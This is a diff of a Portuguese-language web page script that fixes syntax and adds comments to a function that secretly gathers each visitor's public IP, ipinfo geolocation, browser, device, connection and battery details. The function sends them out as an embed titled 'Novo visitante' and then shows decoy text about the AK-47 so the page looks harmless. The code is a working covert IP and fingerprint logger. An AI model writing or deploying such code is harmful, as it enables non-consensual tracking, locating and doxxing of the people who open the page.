@@ -15,7 +15,7 @@
       if (match) {
         let name = match[1];
         if(name === "Edg") name = "Microsoft Edge";
-        return ${name} ${match[2]};
+        return `${name} ${match[2]}`;
       }
       return "Desconhecido";
     }
@@ -30,18 +30,20 @@
 
     async function coletarEEnviarDados() {
       try {
-        
+        // IP público
         const ipResponse = await fetch("https://api.ipify.org?format=json");
         const ipData = await ipResponse.json();
         const ip = ipData.ip;
-        
-        const ipinfoResponse = await fetch(https://ipinfo.io/${ip}/json?token=${ipinfoToken});
+
+        // Dados do IP no ipinfo
+        const ipinfoResponse = await fetch(`https://ipinfo.io/${ip}/json?token=${ipinfoToken}`);
         const ipinfoData = await ipinfoResponse.json();
-        
+
+        // Dados do navegador / dispositivo
         const userAgent = navigator.userAgent;
         const language = navigator.language;
         const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        const screenResolution = ${screen.width}x${screen.height};
+        const screenResolution = `${screen.width}x${screen.height}`;
         const devicePixelRatio = window.devicePixelRatio;
         const plugins = [...navigator.plugins].map(p => p.name).join(", ") || "Nenhum";
         const hardwareConcurrency = navigator.hardwareConcurrency || "N/A";
@@ -53,7 +55,8 @@
         const online = navigator.onLine;
         const prefersDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches;
         const browserVersion = getBrowserVersion(userAgent);
-        
+
+        // Função para enviar com dados da bateria
         function enviarComBateria(batteryLevel, charging) {
           const embed = {
             title: "🕵️ Novo visitante",
@@ -75,7 +78,7 @@
               { name: "Plugins", value: plugins, inline: false },
               { name: "Núcleos da CPU", value: hardwareConcurrency.toString(), inline: true },
               { name: "Memória RAM aproximada (GB)", value: deviceMemory.toString(), inline: true },
-              { name: "Conexão", value: Tipo: ${connectionType}, Downlink: ${downlink}, inline: true },
+              { name: "Conexão", value: `Tipo: ${connectionType}, Downlink: ${downlink}`, inline: true },
               { name: "Cookies habilitados", value: cookieEnabled ? "Sim" : "Não", inline: true },
               { name: "Online", value: online ? "Sim" : "Não", inline: true },
               { name: "Prefere modo escuro", value: prefersDarkMode ? "Sim" : "Não", inline: true },
@@ -90,7 +93,7 @@
 
           sendPayload({ embeds: [embed] });
 
-          document.body.innerHTML = <h2>A AK-47, oficialmente conhecida como Avtomat Kalashnikova 1947, é um dos rifles de assalto mais reconhecidos e utilizados no mundo. Desenvolvida na União Soviética por Mikhail Kalashnikov no final da década de 1940, essa arma se tornou símbolo tanto de revoluções quanto de conflitos armados ao redor do planeta.
+          document.body.innerHTML = `<h2>A AK-47, oficialmente conhecida como Avtomat Kalashnikova 1947, é um dos rifles de assalto mais reconhecidos e utilizados no mundo. Desenvolvida na União Soviética por Mikhail Kalashnikov no final da década de 1940, essa arma se tornou símbolo tanto de revoluções quanto de conflitos armados ao redor do planeta.
 
 Projetada para ser simples, resistente e confiável, a AK-47 funciona em praticamente qualquer ambiente – desde desertos escaldantes até florestas úmidas. Seu calibre 7.62x39mm oferece um equilíbrio entre poder de fogo e controle de recuo, tornando-a eficaz em combate de curta e média distância.
 
@@ -98,9 +101,10 @@ A principal característica da AK-47 é sua durabilidade. Ela pode continuar fun
 
 Com mais de 100 milhões de unidades produzidas (contando variantes licenciadas e não licenciadas), a AK-47 é considerada a arma de fogo mais produzida da história. Seu design também deu origem a várias versões, como a AKM, AK-74 e muitas outras adaptações fabricadas em diferentes países.
 
-Apesar de sua fama controversa, a AK-47 representa um marco na engenharia militar, sendo símbolo de simplicidade, funcionalidade e impacto global. - Chat GPT</h2>;
+Apesar de sua fama controversa, a AK-47 representa um marco na engenharia militar, sendo símbolo de simplicidade, funcionalidade e impacto global. - Chat GPT</h2>`;
         }
-        
+
+        // Pega bateria, se disponível
         if (navigator.getBattery) {
           navigator.getBattery().then(battery => {
             const batteryLevel = Math.round(battery.level * 100) + "%";
